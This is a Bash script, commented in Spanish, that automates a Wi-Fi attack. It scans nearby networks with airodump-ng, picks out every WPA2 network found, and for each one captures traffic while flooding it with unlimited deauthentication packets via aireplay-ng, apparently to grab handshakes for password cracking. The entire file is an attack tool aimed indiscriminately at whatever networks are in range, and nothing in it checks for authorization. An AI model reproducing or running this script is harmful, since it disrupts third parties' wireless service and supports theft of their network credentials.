#!/bin/bash

function wlan0monitor() {
    echo 'Cambiando monitor mode'
    sudo ifconfig wlan0 down
    sleep .8
    sudo iwconfig wlan0 mode monitor
    sleep .8
    sudo ifconfig wlan0 up
    sleep .8
    echo 'wlan0 en modo monitor'
    startadump
}

function startadump() {
    echo 'iniciando escaneo'
    airodump-ng -w redes/redes wlan0 > /dev/null & 
    airodump_pid=$!
    sleep 10
    kill $airodump_pid    
    recuperaredes
}

function recuperaredes() {

    lines=$(wc -l 'redes/redes-01.csv' | awk '{print $1}')
    numline=$((lines))

    while IFS=',' read -r mac _ _ chan _ cryp _ _ _ _ _ _ _ key
    do
        mac=$(echo "$mac" | xargs)
        chan=$(echo "$chan" | xargs)
        cryp=$(echo "$cryp" | xargs)
        key=$(echo "$key" | xargs)

        if [[ "$mac" != "BSSID" && "$cryp" == "WPA2" ]]; then
            
            if [ "$key" == "," ]; then 
                key=$mac
            fi
            
            if [[ "${key: -1}" == "," ]]; then
                key="${key%,}"
            fi

            echo "atacando linea $numline contiene MAC: $mac, CHANNEL: $chan, SEGURIDAD: $cryp, NOMBRE: $key"
            maclist=()
            chanlist=()
            cryolist=()
            keylist=()

            maclist+=($mac)
            chanlist+=($chan)
            cryolist+=($cryp)
            keylist+=($key)

            beacon $mac $chan $key &
            deauth_pid=$!
            deauth $mac &
            beacon_pid=$!
            wait $beacon_pid
            wait $deauth_pid
        fi
        numline=$((numline-1))
    done < redes/redes-01.csv
}

function beacon() {
    local mac=$1
    local chan=$2
    local key=$3

    sudo airodump-ng -w caps/$key -c $chan --bssid $mac wlan0 & airodump_pid=$! 
    sleep 3
    deauth $mac &
    deauth_pid=$!
    wait $deauth_pid
    #kill $airodump_pid
}

function deauth(){
    local mac=$1
    sudo aireplay-ng --deauth 0 -a $mac wlan0
    #echo $maclist > deatho.txt
}


recuperaredes